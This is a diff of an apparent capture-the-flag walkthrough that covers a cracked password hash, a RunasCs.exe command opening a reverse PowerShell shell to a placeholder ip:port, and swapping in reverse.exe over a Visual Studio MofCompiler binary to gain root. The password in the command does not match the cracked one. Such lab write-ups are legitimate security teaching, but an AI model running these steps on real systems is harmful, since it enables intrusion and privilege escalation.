@@ -277,8 +277,7 @@ Which yields`12345678` as Emily's password:
 ```
 sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
 ```
-
-Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
+We use `RunasCs.exe` to catch a shell as Emily from our non-interactive compiler shell.
 
 ```bash
 .\RunasCs.exe Emily 12345679 powershell -r ip:port
@@ -304,7 +303,7 @@ to:
 CopyFile(L"c:\\temp\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
 ```
 
-Compile the exploit with VS Code C++ Release on release mode.
+Compile the exploit with VS Code C++ Release on release mode. Then transfer and execute the binary.
 
 Catch your shell and gain root access!
 
